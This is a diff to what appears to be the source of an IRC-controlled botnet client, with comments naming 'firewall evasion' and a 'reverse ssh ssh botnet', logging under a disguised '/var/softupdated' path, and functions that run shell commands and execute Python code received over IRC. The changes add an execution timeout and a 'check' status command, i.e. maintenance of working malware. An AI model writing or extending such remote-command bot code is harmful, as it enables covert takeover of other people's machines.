@@ -29,7 +29,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "7.5b"                                                                 # bot version
+version = "7.5a"                                                                 # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s(%s).log" % (version, strftime("%m-%d|%H:%M")))                  # redirects bot output to logfile
@@ -397,7 +397,9 @@ def run_shell(cmd, timeout=60, verbose=False):                                  
             continue_running = False
             break
 
-def run_python(cmd):                                                            # interactively interprets recieved python code
+def run_python(cmd, timeout=60):                                                            # interactively interprets recieved python code
+    signal.signal(signal.SIGALRM, timeout_handler)
+    signal.alarm(timeout)
     try:
         try:
             buffer = StringIO()
@@ -417,6 +419,7 @@ def run_python(cmd):                                                            
             out = "[exec]: "+out
     except Exception as python_exception:
         out = "[X]: %s" % python_exception
+    signal.alarm(0)
     return out.strip()
 
 def run(cmd, public=False, return_to=admin):                                    # wrapper for run_shell which improves logging and responses
@@ -685,6 +688,9 @@ if __name__ == '__main__':
 
                         elif content == 'reload':
                             reload_bot()
+
+                        elif content == 'check':
+                            privmsg(str(still_connected(irc)))
 
                         elif content == 'status':
                             privmsg(status_report(connection_time, timeout_count, last_ping))
